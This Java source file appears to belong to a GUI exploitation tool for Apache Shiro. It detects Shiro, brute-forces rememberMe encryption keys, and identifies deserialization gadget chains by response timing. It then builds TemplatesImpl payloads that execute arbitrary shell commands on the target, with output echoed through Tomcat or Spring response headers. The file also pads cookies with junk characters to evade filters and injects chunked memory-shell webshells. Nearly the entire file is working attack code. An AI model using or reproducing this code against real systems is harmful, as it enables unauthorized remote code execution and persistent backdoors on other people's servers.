package com.summersec.attack.core;

import cn.hutool.http.HttpRequest;
import cn.hutool.http.HttpResponse;
import com.mchange.v2.ser.SerializableUtils;
import com.summersec.attack.Encrypt.CbcEncrypt;
import com.summersec.attack.Encrypt.ShiroGCM;
import com.summersec.attack.UI.MainController;
import com.summersec.attack.deser.payloads.ObjectPayload;
import com.summersec.attack.deser.plugins.keytest.KeyEcho;
import com.summersec.attack.entity.ControllersFactory;
import com.summersec.attack.utils.Utils;
import org.apache.shiro.codec.Base64;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javafx.application.Platform;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import java.io.*;
import java.lang.reflect.Field;
import java.net.Proxy;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class HeaderBypassService {

    private final MainController mc;
    private volatile boolean running = false;
    private static final String AT = "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
    private static final Object principal = KeyEcho.getObject();

    private String url, keyWord, httpMethod, postData;
    private int timeout, maxCookieLen, aesGcm;
    private boolean obfuscate = true;
    private Map<String, String> globalHeader;

    public String foundKey, foundGadget;
    private int deleteCount = 0;

    public HeaderBypassService() {
        mc = (MainController) ControllersFactory.controllers.get(MainController.class.getSimpleName());
    }

    public void init(String url, String keyWord, String httpMethod, String postData,
                     int timeout, int maxCookieLen, int aesGcm, boolean obfuscate, Map<String, String> globalHeader) {
        this.url = url;
        this.keyWord = keyWord;
        this.httpMethod = httpMethod;
        this.postData = postData;
        this.timeout = timeout;
        this.maxCookieLen = maxCookieLen;
        this.aesGcm = aesGcm;
        this.obfuscate = obfuscate;
        this.globalHeader = globalHeader;
        if (AttackService.realShiroKey != null) foundKey = AttackService.realShiroKey;
        if (AttackService.gadget != null) foundGadget = AttackService.gadget;
    }

    public void stop() { running = false; }
    public boolean isRunning() { return running; }

    private boolean checkGadgetReady() {
        String key = foundKey;
        if (key == null || key.isEmpty()) key = mc.shiroKey.getText();
        if (key == null || key.isEmpty()) {
            log("[-] 请先获取密钥 (爆破密钥/指定密钥/主标签获取)");
            return false;
        }
        String gadget = foundGadget;
        if (gadget == null || gadget.isEmpty()) gadget = (String) mc.gadgetOpt.getValue();
        if (gadget == null || gadget.isEmpty()) {
            log("[-] 请先爆破利用链");
            return false;
        }
        return true;
    }

    private String encryptObject(Object obj, String key) throws Exception {
        byte[] ser = SerializableUtils.toByteArray(obj);
        if (aesGcm == 1) return new ShiroGCM().encrypt(key, ser);
        else return new CbcEncrypt().encrypt(key, ser);
    }

    private String buildCookie(String rawEncrypted) {
        if (!obfuscate) return keyWord + "=" + rawEncrypted;
        int prefixLen = keyWord.length() + 1;
        return keyWord + "=" + insertJunk(rawEncrypted, maxCookieLen - prefixLen);
    }

    public static String insertJunk(String payload, int maxLen) {
        int budget = maxLen - payload.length();
        int interval;
        if (budget > 0) {
            interval = Math.max(payload.length() / budget, 2);
        } else {
            interval = 10;
        }
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < payload.length(); i++) {
            sb.append(payload.charAt(i));
            if ((i + 1) % interval == 0) {
                if (budget <= 0 || sb.length() + (payload.length() - i - 1) < maxLen)
                    sb.append('$');
            }
        }
        return sb.toString();
    }

    private String sendRequest(String cookie, Map<String, String> extraHeaders, String postBody) {
        return sendRequest(cookie, extraHeaders, postBody, timeout);
    }

    private String sendRequest(String cookie, Map<String, String> extraHeaders, String postBody, int reqTimeout) {
        HttpResponse resp = doSendRequest(cookie, extraHeaders, postBody, reqTimeout);
        String result = resp.toString();
        resp.close();
        return result;
    }

    private HttpResponse doSendRequest(String cookie, Map<String, String> extraHeaders, String postBody, int reqTimeout) {
        String fullCookie = cookie;
        HashMap<String, String> headers = new HashMap<>();
        if (extraHeaders != null) headers.putAll(extraHeaders);
        if (globalHeader != null && !globalHeader.isEmpty()) {
            for (Map.Entry<String, String> entry : globalHeader.entrySet()) {
                if ("Cookie".equalsIgnoreCase(entry.getKey()))
                    fullCookie = entry.getValue() + "; " + cookie;
                else headers.put(entry.getKey(), entry.getValue());
            }
        }
        headers.remove("Cookie");
        Proxy proxy = (Proxy) MainController.currentProxy.get("proxy");
        HttpRequest req;
        if ("POST".equalsIgnoreCase(httpMethod)) {
            req = HttpRequest.post(url);
            String body = (postBody != null && !postBody.isEmpty()) ? postBody : postData;
            if (body != null && !body.isEmpty())
                req.body(body, "application/x-www-form-urlencoded");
        } else {
            req = HttpRequest.get(url);
        }
        req.timeout(reqTimeout);
        req.cookie(fullCookie);
        if (proxy != null) req.setProxy(proxy);
        req.headerMap(headers, true);
        req.setFollowRedirects(false);
        return req.execute();
    }

    private int countDeleteMe(String text) {
        Matcher m = Pattern.compile("deleteMe").matcher(text);
        int c = 0;
        while (m.find()) c++;
        return c;
    }

    private List<String> loadShiroKeys() {
        List<String> keys = new ArrayList<>();
        try {
            String cwd = System.getProperty("user.dir");
            File f = new File(cwd + File.separator + "data" + File.separator + "shiro_keys.txt");
            BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(f), "UTF-8"));
            String line;
            while ((line = br.readLine()) != null) keys.add(line);
            br.close();
        } catch (Exception e) {
            log("[-] 加载密钥文件失败: " + e.getMessage());
        }
        return keys;
    }

    public void checkIsShiro() {
        new Thread(() -> {
            try {
                String cookie = keyWord + "=yes";
                String result = sendRequest(cookie, null, null);
                boolean found = result.contains("=deleteMe");
                if (!found) {
                    cookie = keyWord + "=" + AttackService.getRandomString(10);
                    result = sendRequest(cookie, null, null);
                    found = result.contains("=deleteMe");
                }
                if (found) {
                    deleteCount = countDeleteMe(result);
                    log("[+] 存在Shiro框架 (deleteMe x" + deleteCount + ")");
                } else {
                    log("[-] 未发现Shiro框架");
                }
            } catch (Exception e) {
                log("[-] " + e.getMessage());
            }
        }).start();
    }

    public void crackAllKeys() {
        List<String> keys = loadShiroKeys();
        if (keys.isEmpty()) { log("[-] 密钥文件为空"); return; }
        crackKeys(keys);
    }

    public void crackSingleKey(String key) {
        crackKeys(Collections.singletonList(key));
    }

    private void crackKeys(List<String> keys) {
        running = true;
        new Thread(() -> {
            try {
                log("[*] 开始爆破密钥, 共 " + keys.size() + " 个");
                for (int i = 0; i < keys.size() && running; i++) {
                    String key = keys.get(i);
                    try {
                        String encrypted = encryptObject(principal, key);
                        String cookie = buildCookie(encrypted);
                        String result = sendRequest(cookie, null, null);
                        Thread.sleep(100);
                        boolean hit;
                        if (deleteCount > 0) hit = countDeleteMe(result) < deleteCount;
                        else hit = result != null && !result.isEmpty() && !result.contains("=deleteMe");
                        if (hit) {
                            foundKey = key;
                            log("[+] 找到密钥: " + key + " (cookie_len=" + cookie.length() + ")");
                            Platform.runLater(() -> mc.shiroKey.setText(key));
                            break;
                        }
                        log("[-] " + key);
                    } catch (Throwable e) {
                        log("[-] " + key + " " + e.getMessage());
                    }
                }
                log("[*] 密钥爆破结束");
            } catch (Throwable e) {
                log("[-] " + e.getMessage());
            } finally { running = false; }
        }).start();
    }

    public void crackAllGadgets() {
        String key = getKey();
        if (key == null) return;
        List<String> gadgets = mc.gadgetOpt.getItems();
        running = true;
        new Thread(() -> {
            try {
                long baseline = measureBaseline();
                log("[*] 基准响应: " + baseline + "ms");
                boolean found = false;
                for (String g : gadgets) {
                    if (!running) return;
                    if (tryCrackGadgetTiming(g, key, baseline)) { found = true; break; }
                }
                if (!found) log("[-] 未找到可用利用链");
            } finally { running = false; }
        }).start();
    }

    public void crackSpcGadget() {
        String key = getKey();
        if (key == null) return;
        String g = (String) mc.gadgetOpt.getValue();
        running = true;
        new Thread(() -> {
            try {
                long baseline = measureBaseline();
                if (!tryCrackGadgetTiming(g, key, baseline)) log("[-] 该利用链不可用");
            } finally { running = false; }
        }).start();
    }

    private long measureBaseline() {
        long start = System.currentTimeMillis();
        sendRequest(keyWord + "=test", null, null, timeout);
        return System.currentTimeMillis() - start;
    }

    private boolean tryCrackGadgetTiming(String gadget, String key, long baseline) {
        try {
            long sleepMs = 2000;
            ClassPool pool = ClassPool.getDefault();
            CtClass c = pool.makeClass("V" + System.nanoTime());
            c.setSuperclass(pool.get(AT));
            c.makeClassInitializer().setBody("{try{Thread.sleep(" + sleepMs + "L);}catch(Exception e){}}");
            c.getClassFile().setMajorVersion(50);
            byte[] bytes = c.toBytecode();
            c.detach();

            String encrypted = encryptBytesToRaw(bytes, key, gadget);
            String cookie = buildCookie(encrypted);
            log("[*] 测试 " + gadget + " (cookie_len=" + cookie.length() + ")");

            int timingTimeout = (int) Math.max(timeout, baseline + sleepMs + 5000);
            long start = System.currentTimeMillis();
            sendRequest(cookie, null, null, timingTimeout);
            long elapsed = System.currentTimeMillis() - start;

            if (elapsed >= baseline + sleepMs - 500) {
                foundGadget = gadget;
                log("[+] 找到利用链: " + gadget + " (延迟: " + elapsed + "ms, 基准: " + baseline + "ms)");
                Platform.runLater(() -> mc.gadgetOpt.setValue(gadget));
                return true;
            }
            log("[-] " + gadget + " (" + elapsed + "ms)");
        } catch (Throwable e) {
            log("[-] " + gadget + " " + e.getMessage());
        }
        return false;
    }

    public void execCmdBlind(String command) {
        if (!checkGadgetReady()) return;
        String key = getKey();
        if (key == null) return;
        foundGadget = (String) mc.gadgetOpt.getValue();
        new Thread(() -> {
            try {
                String escaped = command.replace("\\", "\\\\").replace("\"", "\\\"");
                ClassPool pool = ClassPool.getDefault();
                CtClass c = pool.makeClass("B" + System.nanoTime());
                c.setSuperclass(pool.get(AT));
                c.makeClassInitializer().setBody(
                    "{Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"" + escaped + "\"});}");
                c.getClassFile().setMajorVersion(50);
                byte[] b = c.toBytecode(); c.detach();
                String enc = encryptBytesToRaw(b, key);
                String ck = buildCookie(enc);
                log("[*] 盲执行: " + command + " (cookie_len=" + ck.length() + ")");
                sendRequest(ck, null, null);
                log("[+] 已发送");
            } catch (Throwable e) {
                log("[-] " + e.getMessage());
            }
        }).start();
    }

    public void execCmdEcho(String command, String echoType) {
        if (!checkGadgetReady()) return;
        String key = getKey();
        if (key == null) return;
        foundGadget = (String) mc.gadgetOpt.getValue();
        new Thread(() -> {
            try {
                String escaped = command.replace("\\", "\\\\").replace("\"", "\\\"");
                ClassPool pool = ClassPool.getDefault();

                CtClass c = pool.makeClass("E" + System.nanoTime());
                c.setSuperclass(pool.get(AT));

                if ("Tomcat".equals(echoType)) {
                    c.addMethod(CtMethod.make(
                        "private static Object g(Object o,String n)throws Exception{"
                        + "Class c=o.getClass();"
                        + "while(c!=null){try{java.lang.reflect.Field f=c.getDeclaredField(n);"
                        + "f.setAccessible(true);return f.get(o);}"
                        + "catch(Exception e){c=c.getSuperclass();}}return null;}", c));
                    c.makeClassInitializer().setBody(
                        "{try{"
                        + "String[] cmd=System.getProperty(\"os.name\").toLowerCase().contains(\"win\")"
                        + "?new String[]{\"cmd\",\"/c\",\"" + escaped + "\"}"
                        + ":new String[]{\"/bin/sh\",\"-c\",\"" + escaped + "\"};"
                        + "String out=org.apache.shiro.codec.Base64.encodeToString("
                        + "new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream())"
                        + ".useDelimiter(\"\\\\A\").next().getBytes());"
                        + "boolean done=false;"
                        + "Thread[] ts=(Thread[])g(Thread.currentThread().getThreadGroup(),\"threads\");"
                        + "for(int i=0;i<ts.length&&!done;i++){"
                        + "if(ts[i]==null)continue;"
                        + "String n=ts[i].getName();"
                        + "if(!n.contains(\"exec\")&&n.contains(\"http\")){"
                        + "Object v=g(ts[i],\"target\");"
                        + "if(v instanceof Runnable){"
                        + "try{v=g(g(g(v,\"this$0\"),\"handler\"),\"global\");"
                        + "java.util.List ps=(java.util.List)g(v,\"processors\");"
                        + "for(int j=0;j<ps.size()&&!done;j++){"
                        + "Object req=g(ps.get(j),\"req\");"
                        + "String h=(String)req.getClass().getMethod(\"getHeader\",new Class[]{String.class}).invoke(req,new Object[]{\"Host\"});"
                        + "if(h!=null&&!h.isEmpty()){"
                        + "Object rp=req.getClass().getMethod(\"getResponse\",new Class[0]).invoke(req,new Object[0]);"
                        + "rp.getClass().getMethod(\"setStatus\",new Class[]{Integer.TYPE}).invoke(rp,new Object[]{new Integer(200)});"
                        + "rp.getClass().getMethod(\"addHeader\",new Class[]{String.class,String.class}).invoke(rp,new Object[]{\"X-C\",out});"
                        + "done=true;}}"
                        + "}catch(Exception e){continue;}"
                        + "}}}"
                        + "}catch(Exception e){}}"
                    );
                } else {
                    c.makeClassInitializer().setBody(
                        "{try{"
                        + "String[] cmd=System.getProperty(\"os.name\").toLowerCase().contains(\"win\")"
                        + "?new String[]{\"cmd\",\"/c\",\"" + escaped + "\"}"
                        + ":new String[]{\"/bin/sh\",\"-c\",\"" + escaped + "\"};"
                        + "String out=org.apache.shiro.codec.Base64.encodeToString("
                        + "new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream())"
                        + ".useDelimiter(\"\\\\A\").next().getBytes());"
                        + "javax.servlet.http.HttpServletResponse rsp="
                        + "((org.springframework.web.context.request.ServletRequestAttributes)"
                        + "org.springframework.web.context.request.RequestContextHolder"
                        + ".getRequestAttributes()).getResponse();"
                        + "rsp.setHeader(\"X-C\",out);"
                        + "}catch(Exception e){}}"
                    );
                }

                byte[] classBytes = toCompatibleBytecode(c);
                String encrypted = encryptBytesToRaw(classBytes, key);
                String cookie = buildCookie(encrypted);
                String obfMsg = obfuscate ? " 已混淆" : "";
                if (obfuscate && cookie.length() > maxCookieLen) {
                    obfMsg = " 已混淆 [!]超长" + cookie.length() + ">" + maxCookieLen + ",如失败请取消混淆或增大Cookie限长";
                }
                log("[*] 回显执行(" + echoType + "): " + command + " (cookie=" + cookie.length() + obfMsg + ")");
                HttpResponse resp = doSendRequest(cookie, null, null, timeout);
                String hv = resp.header("X-C");
                int status = resp.getStatus();
                resp.close();

                if (hv != null && !hv.isEmpty()) {
                    byte[] decoded = Base64.decode(hv);
                    String output;
                    try { output = new String(decoded, Utils.guessEncoding(decoded)); }
                    catch (Exception e) { output = new String(decoded); }
                    log(output);
                    log("-----------------------------------------------------------------------");
                } else {
                    log("[-] 未获取到回显 (HTTP " + status + ", 尝试使用盲执行)");
                }
            } catch (Throwable e) {
                log("[-] " + e.getMessage());
            }
        }).start();
    }

    public void injectMemshell(int methodIdx, String memshellB64, int chunkSize, int delay, String filePath) {
        String key = getKey();
        if (key == null) return;
        foundGadget = (String) mc.gadgetOpt.getValue();
        running = true;
        new Thread(() -> {
            try {
                String[] methods = {"文件落地", "线程名存储", "系统属性存储"};
                log("[*] 注入方式: " + methods[methodIdx] + " | 分块: " + chunkSize + " | 利用链: " + foundGadget);

                List<byte[]> payloads;
                switch (methodIdx) {
                    case 0: payloads = genFileWrite(memshellB64, chunkSize, filePath); break;
                    case 1: payloads = genThreadName(memshellB64, chunkSize); break;
                    default: payloads = genSystemProperty(memshellB64, chunkSize); break;
                }

                int total = payloads.size();
                log("[*] 共 " + total + " 个payload (含加载器)");

                for (int i = 0; i < total && running; i++) {
                    String encrypted = encryptBytesToRaw(payloads.get(i), key);
                    String cookie = buildCookie(encrypted);
                    String resp = sendRequest(cookie, null, null);
                    String status = (i == total - 1 && resp.contains("500")) ? " (500是正常现象,内存马触发了response commit)" : "";
                    log("[+] " + (i + 1) + "/" + total + " cookie_len=" + cookie.length() + status);
                    if (i < total - 1 && running) Thread.sleep(delay);
                }
                if (running) log("[+] 发送完成！请验证内存马连接");
                else log("[!] 已停止");
            } catch (Throwable e) {
                log("[-] " + e.getMessage());
            } finally { running = false; }
        }).start();
    }

    private String encryptBytesToRaw(byte[] classBytes, String key) throws Exception {
        return encryptBytesToRaw(classBytes, key, foundGadget);
    }

    private String encryptBytesToRaw(byte[] classBytes, String key, String gadget) throws Exception {
        TemplatesImpl t = new TemplatesImpl();
        setField(t, "_bytecodes", new byte[][]{classBytes});
        setField(t, "_name", "a");
        setField(t, "_tfactory", new TransformerFactoryImpl());
        Class<? extends ObjectPayload> gc = ObjectPayload.Utils.getPayloadClass(gadget);
        ObjectPayload<?> gp = gc.newInstance();
        Object chain = gp.getObject(t);
        return encryptObject(chain, key);
    }

    public int calculateOptimalGroupSize(int methodIdx) {
        String key = getKey();
        if (key == null) return 200;
        foundGadget = (String) mc.gadgetOpt.getValue();
        try {
            int prefixLen = keyWord.length() + 1;
            int targetEncLen = maxCookieLen - prefixLen;

            int s1 = 100, s2 = 500;
            StringBuilder sb1 = new StringBuilder(), sb2 = new StringBuilder();
            for (int i = 0; i < s1; i++) sb1.append('A');
            for (int i = 0; i < s2; i++) sb2.append('A');

            byte[] bc1 = getTestChunkBytecode(methodIdx, sb1.toString(), s1);
            byte[] bc2 = getTestChunkBytecode(methodIdx, sb2.toString(), s2);
            String enc1 = encryptBytesToRaw(bc1, key);
            String enc2 = encryptBytesToRaw(bc2, key);

            double slope = (double)(enc2.length() - enc1.length()) / (s2 - s1);
            double intercept = enc1.length() - slope * s1;
            int optimal = (int)((targetEncLen * 0.9 - intercept) / slope);
            optimal = Math.max(optimal, 50);
            log("[*] 测量: chunk=" + s1 + "→enc=" + enc1.length() + ", chunk=" + s2 + "→enc=" + enc2.length());

            while (optimal > 50) {
                StringBuilder sbv = new StringBuilder();
                for (int i = 0; i < optimal; i++) sbv.append('A');
                byte[] bcv = getTestChunkBytecode(methodIdx, sbv.toString(), optimal);
                String encv = encryptBytesToRaw(bcv, key);
                if (encv.length() <= targetEncLen) {
                    log("[*] 验证通过: chunk=" + optimal + " → enc=" + encv.length() + " ≤ " + targetEncLen);
                    break;
                }
                log("[*] 验证失败: chunk=" + optimal + " → enc=" + encv.length() + " > " + targetEncLen + ", 缩减");
                optimal = (int)(optimal * 0.75);
            }
            optimal = Math.max(optimal, 50);
            log("[*] 最优分块: " + optimal);
            return optimal;
        } catch (Exception e) {
            log("[-] 计算失败: " + e.getMessage());
            return 200;
        }
    }

    private byte[] getTestChunkBytecode(int methodIdx, String testB64, int chunkSize) throws Exception {
        List<byte[]> payloads;
        switch (methodIdx) {
            case 0: payloads = genFileWrite(testB64, chunkSize, "/tmp/"); break;
            case 1: payloads = genThreadName(testB64, chunkSize); break;
            default: payloads = genSystemProperty(testB64, chunkSize); break;
        }
        return payloads.get(methodIdx == 1 ? 1 : 0);
    }

    private String getKey() {
        String key = foundKey;
        if (key == null || key.isEmpty()) key = mc.shiroKey.getText();
        if (key == null || key.isEmpty()) { log("[-] 请先获取密钥"); return null; }
        return key;
    }

    private void setField(Object obj, String name, Object value) throws Exception {
        Field f = obj.getClass().getDeclaredField(name);
        f.setAccessible(true);
        f.set(obj, value);
    }

    private static byte[] toCompatibleBytecode(CtClass c) throws Exception {
        c.getClassFile().setMajorVersion(50);
        byte[] b = c.toBytecode();
        c.detach();
        return b;
    }

    private List<byte[]> genFileWrite(String b64, int gs, String path) throws Exception {
        List<byte[]> r = new ArrayList<>();
        ClassPool pool = ClassPool.getDefault();
        long ts = System.currentTimeMillis();
        String fp = path.endsWith("/") ? path + ts + ".txt" : path + "/" + ts + ".txt";
        log("[*] 临时文件: " + fp);
        int len = b64.length(), si = 0, a = 1;
        while (si < len) {
            int ei = Math.min(si + gs, len);
            String chunk = b64.substring(si, ei);
            CtClass c = pool.makeClass("FW" + ts + "_" + a); c.setSuperclass(pool.get(AT));
            c.makeClassInitializer().setBody(
                "{try{java.io.FileOutputStream fos=new java.io.FileOutputStream(\"" + fp + "\"," + (a > 1) + ");"
                + "fos.write(\"" + chunk + "\".getBytes(\"UTF-8\"));fos.close();"
                + "}catch(Exception e){}}");
            r.add(toCompatibleBytecode(c)); si = ei; a++;
        }
        CtClass ld = pool.makeClass("FWL" + ts); ld.setSuperclass(pool.get(AT));
        ld.makeClassInitializer().setBody(
            "{try{java.io.File f=new java.io.File(\"" + fp + "\");"
            + "java.io.FileInputStream fis=new java.io.FileInputStream(f);"
            + "byte[] fb=new byte[(int)f.length()];fis.read(fb);fis.close();"
            + "byte[] cb=(byte[])Class.forName(\"org.apache.shiro.codec.Base64\").getMethod(\"decode\",new Class[]{String.class}).invoke(null,new Object[]{new String(fb,\"UTF-8\")});"
            + "java.lang.reflect.Method dc=ClassLoader.class.getDeclaredMethod(\"defineClass\",new Class[]{byte[].class,int.class,int.class});"
            + "dc.setAccessible(true);"
            + "((Class)dc.invoke(Thread.currentThread().getContextClassLoader(),new Object[]{cb,new Integer(0),new Integer(cb.length)})).newInstance();"
            + "f.delete();}catch(Exception e){}}");
        r.add(toCompatibleBytecode(ld));
        return r;
    }

    private List<byte[]> genThreadName(String b64, int gs) throws Exception {
        List<byte[]> r = new ArrayList<>();
        ClassPool pool = ClassPool.getDefault();
        long ts = System.currentTimeMillis();
        CtClass init = pool.makeClass("TN" + ts + "_0"); init.setSuperclass(pool.get(AT));
        init.makeClassInitializer().setBody("{try{Thread.currentThread().setName(\"Test\");}catch(Exception e){}}");
        r.add(toCompatibleBytecode(init));
        int len = b64.length(), si = 0, a = 1;
        while (si < len) {
            int ei = Math.min(si + gs, len);
            String chunk = b64.substring(si, ei);
            CtClass c = pool.makeClass("TN" + ts + "_" + a); c.setSuperclass(pool.get(AT));
            c.makeClassInitializer().setBody(
                "{try {ThreadGroup a = Thread.currentThread().getThreadGroup();"
                + "java.lang.reflect.Field v2 = a.getClass().getDeclaredField(\"threads\");"
                + "v2.setAccessible(true);Thread[] o = (Thread[]) v2.get(a);"
                + "for(int i = 0; i < o.length; ++i) {"
                + "Thread z = o[i]; if (z != null && z.getName().contains(\"Test\")){"
                + "z.setName(z.getName()+\"" + chunk + "\");"
                + "}}} catch (Exception e){}}");
            r.add(toCompatibleBytecode(c)); si = ei; a++;
        }
        CtClass ld = pool.makeClass("TNL" + ts); ld.setSuperclass(pool.get(AT));
        ld.makeClassInitializer().setBody(
            "{try {ThreadGroup tg = Thread.currentThread().getThreadGroup();"
            + "java.lang.reflect.Field tf = tg.getClass().getDeclaredField(\"threads\");"
            + "tf.setAccessible(true);Thread[] ts = (Thread[]) tf.get(tg);"
            + "for(int i=0;i<ts.length;i++){"
            + "if(ts[i]!=null && ts[i].getName().contains(\"Test\")){"
            + "String p = ts[i].getName().replace(\"Test\",\"\");"
            + "byte[] cb=(byte[])Class.forName(\"org.apache.shiro.codec.Base64\").getMethod(\"decode\",new Class[]{String.class}).invoke(null,new Object[]{p});"
            + "java.lang.reflect.Method dc = ClassLoader.class.getDeclaredMethod(\"defineClass\", new Class[]{byte[].class, int.class, int.class});"
            + "dc.setAccessible(true);"
            + "((Class)dc.invoke(Thread.currentThread().getContextClassLoader(), new Object[]{cb, new Integer(0), new Integer(cb.length)})).newInstance();"
            + "ts[i].setName(\"http-nio-exec-1\");break;}}"
            + "} catch(Exception e){}}");
        r.add(toCompatibleBytecode(ld));
        return r;
    }

    private List<byte[]> genSystemProperty(String b64, int gs) throws Exception {
        List<byte[]> r = new ArrayList<>();
        ClassPool pool = ClassPool.getDefault();
        long ts = System.currentTimeMillis();
        int len = b64.length(), si = 0, a = 1;
        while (si < len) {
            int ei = Math.min(si + gs, len);
            String chunk = b64.substring(si, ei);
            CtClass c = pool.makeClass("SP" + ts + "_" + a); c.setSuperclass(pool.get(AT));
            c.makeClassInitializer().setBody("{try{System.setProperty(\"" + a + "\",\"" + chunk + "\");}catch(Exception e){}}");
            r.add(toCompatibleBytecode(c)); si = ei; a++;
        }
        CtClass ld = pool.makeClass("SPL" + ts); ld.setSuperclass(pool.get(AT));
        ld.makeClassInitializer().setBody(
            "{try {StringBuffer sb = new StringBuffer();"
            + "for(int i=1;;i++){String v = System.getProperty(\"\"+i);if(v==null) break;sb.append(v);}"
            + "byte[] cb=(byte[])Class.forName(\"org.apache.shiro.codec.Base64\").getMethod(\"decode\",new Class[]{String.class}).invoke(null,new Object[]{sb.toString()});"
            + "java.lang.reflect.Method dc = ClassLoader.class.getDeclaredMethod(\"defineClass\", new Class[]{byte[].class, int.class, int.class});"
            + "dc.setAccessible(true);"
            + "((Class)dc.invoke(Thread.currentThread().getContextClassLoader(), new Object[]{cb, new Integer(0), new Integer(cb.length)})).newInstance();"
            + "for(int j=1;;j++){if(System.getProperty(\"\"+j)==null) break;System.clearProperty(\"\"+j);}"
            + "} catch(Exception e){}}");
        r.add(toCompatibleBytecode(ld));
        return r;
    }

    private void log(String msg) {
        Platform.runLater(() -> mc.bypassOutputArea.appendText(Utils.log(msg)));
    }
}
